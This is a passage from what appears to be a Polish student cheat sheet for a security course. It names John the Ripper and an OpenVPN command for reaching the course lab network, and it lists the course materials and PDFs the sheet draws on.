- **John the Ripper** - narzędzie do audytu haseł.
- **OpenVPN** - łączy z siecią laboratorium; polecenie z PDF-ów: `sudo openvpn /sciezka/do/pliku.ovpn`.

## Źródła

Podstawą są pliki `cw01`-`cw07` z [repozytorium BSI](https://github.com/M1CH4L9/BSI), zarówno `.md`, jak i PDF-y podstawowe i PENTEST. Szczegółową listę 14 PDF-ów z numerami stron znajdziesz na końcu [przygotowania do kolokwium](/przedmioty/bsi/bsi-kolokwium-1/). Rozdziały tej ściągi łączą komendy z obu typów źródeł; oznaczone uzupełnienia, takie jak `pwd` i `crontab -l`, pomagają bezpiecznie odczytać kontekst ćwiczenia.
